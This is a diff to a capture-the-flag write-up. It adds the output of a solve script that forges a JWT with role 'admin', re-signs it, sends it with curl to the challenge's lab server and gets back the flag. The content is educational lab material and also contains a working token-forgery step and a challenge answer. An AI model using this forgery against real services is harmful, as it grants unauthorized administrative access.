@@ -231,3 +231,15 @@ echo -e "Signed Token: $resigned_token\n"
 curl -H "Authorization: Bearer $resigned_token" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
 ```
 
+Running solve.sh
+```bash
+redfl4g@kali$./solve.sh
+
+Header: {"alg":"HS256","typ":"JWT"}
+
+Payload: {"username":"minion","role":"admin","iat":1607535677}
+
+Signed Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzUzNTY3N30.yjwreZOzRkkcxfKYLaL8oFaVDbkpsKO6MGm_k5PId8s
+
+{"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}
+```
